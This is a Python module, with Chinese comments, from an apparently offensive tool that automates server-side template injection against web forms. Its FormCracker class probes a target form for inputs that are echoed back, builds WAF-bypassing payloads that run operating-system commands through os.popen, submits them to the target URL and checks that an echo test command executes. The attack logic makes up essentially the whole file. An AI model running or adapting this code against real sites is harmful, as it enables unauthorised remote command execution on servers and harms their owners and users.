"""攻击指定的表单

"""

from collections import namedtuple
import logging
from typing import List, Dict, Any, Union, Callable

from .form import random_fill, fill_form
from .requester import Requester
from .colorize import colored
from .const import (
    CALLBACK_SUBMIT,
    CALLBACK_TEST_FORM_INPUT,
    OS_POPEN_READ,
)
from .waf_func_gen import WafFuncGen
from .full_payload_gen import FullPayloadGen

logger = logging.getLogger("form_cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class FormCracker:
    """对指定的文档进行攻击
    其接受一个表格及其对应的URL，还有一个用于发送请求的requester。
    其会根据一系列危险的关键字获取被WAF时页面的hash, 据此生成一个waf函数用于生成payload
    """

    test_cmd = "echo f3n  j1ng;"
    test_result = "f3n j1ng"
    test_vulunable_inputs_times = 5

    def __init__(
        self,
        url: str,
        form: Dict[str, Any],
        requester: Requester,
        callback: Union[Callable[[str, Dict], None], None] = None,
    ):
        """生成用于攻击form的类

        Args:
            url (str, optional): form所在的url.
            form (dict): 解析后的form元素
            requester (Requester, optional): 用于发出请求的requester，为None时自动构造.
            callback (Union[Callable[[str, Dict], None], None]):
                callback函数，在完成某些阶段后会调用此函数
        """
        self.url = url
        self.form = form
        self.req = requester
        self._callback: Callable[[str, Dict], None] = (
            callback if callback else (lambda x, y: None)
        )
        self.waf_func_gen = WafFuncGen(
            self.url, self.form, self.req, self.callback
        )

    @property
    def callback(self):
        """Callback函数

        Returns:
            Callable: Callback函数
        """
        return self._callback

    @callback.setter
    def callback(self, callback):
        self._callback = callback

    def vulunable_inputs(self) -> List[str]:
        """解析出form中有回显的input

        Returns:
            List[str]: 所有有回显的input name
        """
        answers = []
        for _ in range(self.test_vulunable_inputs_times):
            fill_dict = random_fill(self.form)
            r = self.req.request(
                **fill_form(self.url, self.form, form_inputs=fill_dict)
            )
            assert r is not None
            answers += [k for k, v in fill_dict.items() if v in r.text]
        return list(set(answers))

    def submit(self, inputs: dict):
        """根据inputs提交form

        Args:
            inputs (dict): 需要提交的input

        Returns:
            requests.Response: 返回的reponse元素
        """
        all_length = sum(len(v) for v in inputs.values())
        if all_length > 2048 and self.form["method"] == "GET":
            logger.warning(
                "inputs are extremely long (len=%d) that "
                + "the request might fail",
                all_length,
            )

        resp = self.req.request(**fill_form(self.url, self.form, inputs))

        self.callback(
            CALLBACK_SUBMIT,
            {
                "form": self.form,
                "inputs": inputs,
                "response": resp,
            },
        )

        return resp

    def test_input(self, input_field: str, payload: str) -> bool:
        """测试对应的表单项是否有回显

        Args:
            input_field (str): 表单项
            payload (str): 表单项的值

        Returns:
            bool: 是否有回显
        """
        logger.info(
            "Input %s looks great, testing generated payload.",
            colored("yellow", repr(input_field)),
        )
        resp = self.submit({input_field: payload})
        assert resp is not None
        return self.test_result in resp.text

    def crack_inputs(self, input_field: str) -> Union[Result, None]:
        """攻击对应的input

        Args:
            input_field (str): 需要攻击的input

        Returns:
            Union[Result, None]: 对应的payload生成函数，以及对应的input
        """
        logger.info("Testing %s", colored("yellow", input_field))

        waf_func = self.waf_func_gen.generate(input_field)
        full_payload_gen = FullPayloadGen(waf_func, callback=self.callback)
        payload, will_print = full_payload_gen.generate(
            OS_POPEN_READ, self.test_cmd
        )
        if payload is None:
            self.callback(
                CALLBACK_TEST_FORM_INPUT,
                {
                    "ok": False,
                },
            )
            return None
        # payload测试成功时为True, 失败时为False, 无法测试为None
        is_test_success = None
        if will_print:
            if self.test_input(input_field, payload):
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
                is_test_success = True
            else:
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
        else:
            logger.info(
                "Input %s looks great, "
                + "but we WON'T SEE the execution result! "
                + "You can try generating payloads anyway.",
                input_field,
            )

        self.callback(
            CALLBACK_TEST_FORM_INPUT,
            {
                "ok": True,
                "will_print": will_print,
                "test_success": is_test_success,
                "input_field": input_field,
            },
        )
        return Result(
            full_payload_gen=full_payload_gen, input_field=input_field
        )

    def crack(self) -> Union[Result, None]:
        """攻击表单

        Returns:
            Union[Result, None]: 对应的payload生成函数，以及对应的input
        """
        logger.info("Start cracking %s", self.form)
        vulunables = self.vulunable_inputs()
        logger.info(
            "These inputs might be vulunable: %s",
            colored("yellow", repr(vulunables)),
        )

        for input_field in vulunables:
            result = self.crack_inputs(input_field)
            if result:
                return result
        logger.warning("Failed...")
        return None
